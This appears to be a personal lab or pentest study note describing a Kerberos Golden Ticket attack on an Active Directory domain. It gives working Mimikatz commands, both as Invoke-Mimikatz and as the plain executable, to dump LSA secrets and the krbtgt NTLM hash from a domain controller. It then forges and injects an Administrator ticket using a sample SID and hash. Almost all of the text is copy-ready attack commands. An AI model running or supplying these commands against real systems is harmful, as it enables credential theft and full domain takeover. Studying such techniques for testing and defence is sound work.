# **STEP 1 (Get the krbtgt NTLM hash)**

Run this command on the domain controller because these hashes can only be available in the DC's Lsa that's why we have to run this command on to the domain controller to extract the Lsa Secrets which also contains the KRBTGT ntlm hash, in this case we need KRBTGT's account NTLM hash.

this command will dump the lsa secrets form the domain controller 
 
```
Invoke-Mimikatz command
```
```
invoke-mimikatz  -Command '"lsadump::lsa /patch"' -ComputerName dc02.universe.com
```

![[Pasted image 20251221094917.png]]

### Mimikatz.exe command  
```
lsadump::lsa /patch
```
![[Pasted image 20251221094935.png]]
Note: this would not work because we have to be on the domain controller to harvest hashes from LSA, as now we are on a workstation that doesn't has the krbtgt hash in it's lsa secrets.  

__________
# **STEP 2 (Create a Golden Ticket and Pass the Hash on Current Session )**

Now e can use any privilege on any machine even non domain-joined machine to create a Golden ticket, Now we create Golden Ticket by using the KRBTGT Ntlm Hash with command. 

Invoke-Mimikatz command
```
invoke-mimikatz  -Command '"kerberos::golden /user:Administrator /sid:S-1-5-21-3323191838-1711971207-1097898698 /domain:universe.com /krbtgt:8de27e7bd8c073e4a12520b75d72a51c /ptt"'
```
![[Pasted image 20251221095007.png]]

Mimikatz.exe command 
```
kerberos::golden /user:Administrator /sid:S-1-5-21-3323191838-1711971207-1097898698 /domain:universe.com /krbtgt:8de27e7bd8c073e4a12520b75d72a51c /ptt
```
![[Pasted image 20251221095015.png]]







